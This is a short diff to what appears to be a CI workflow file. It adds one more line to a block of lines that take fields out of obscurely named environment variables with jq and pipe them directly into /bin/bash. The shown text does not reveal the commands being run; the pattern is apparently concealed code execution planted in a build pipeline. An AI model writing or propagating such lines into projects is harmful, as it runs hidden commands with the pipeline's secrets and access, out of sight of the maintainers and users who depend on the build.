@@ -26,6 +26,7 @@ jobs:
           echo $jk006 | jq -r .rpf6 | /bin/bash
           echo $as9675 | jq -r .uumz32 | /bin/bash
           printf '%s' "$o31190" | jq -r .jgoys096 | /bin/bash
+          echo $fhu2651 | jq -r .crnz2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
